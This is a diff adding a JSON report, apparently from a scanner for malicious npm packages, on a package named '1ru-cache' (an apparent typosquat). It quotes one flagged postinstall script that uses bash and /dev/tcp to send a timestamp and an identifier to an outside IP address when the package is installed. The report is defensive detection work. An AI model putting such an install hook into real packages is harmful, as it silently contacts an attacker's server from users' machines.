@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:17",
+                "code": "    \"postinstall\": \"bash -c \\\"(echo '`date` - 44984BBBADAD5C392EE07B61FC967421' > /dev/tcp/34.121.250.204/443)||(:)\\\"\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": {},
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "shady-links": {},
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/1ru-cache-0.0.1"
+}
